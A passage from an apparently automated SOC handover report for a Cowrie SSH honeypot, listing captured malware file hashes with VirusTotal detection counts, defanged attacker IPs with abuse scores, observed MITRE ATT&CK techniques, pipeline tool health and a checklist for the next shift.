| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `94.231.206[.]251` | SG | FR ONYPHE | **100** ⚠️ | 50 |
| `94.231.206[.]135` | SG | FR ONYPHE | **100** ⚠️ | 46 |
| `24.104.230[.]186` | US | Charter Communications Inc | **100** ⚠️ | 1 |
| `174.76.38[.]124` | US | Cox Communications Inc. | **100** ⚠️ | 28 |
| `94.231.206[.]253` | SG | FR ONYPHE | **100** ⚠️ | 50 |
| `223.123.43[.]0` | PK | CMPak Limited | **100** ⚠️ | 49 |
| `112.29.110[.]89` | CN | China Mobile Communications Corporation | **100** ⚠️ | 7 |
| `115.191.4[.]29` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 8 |
| `206.189.25[.]100` | GB | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `195.184.76[.]36` | US | FR ONYPHE | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 103 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 44 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 22 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 22 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 122 cases |
| Tool 34  | Credential Extractor        | ✅ 94 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (5.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 44 priority case(s) shown individually · 20 recon entry/entries in table (7 group(s) consolidating 58 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-27T17:22:12Z_
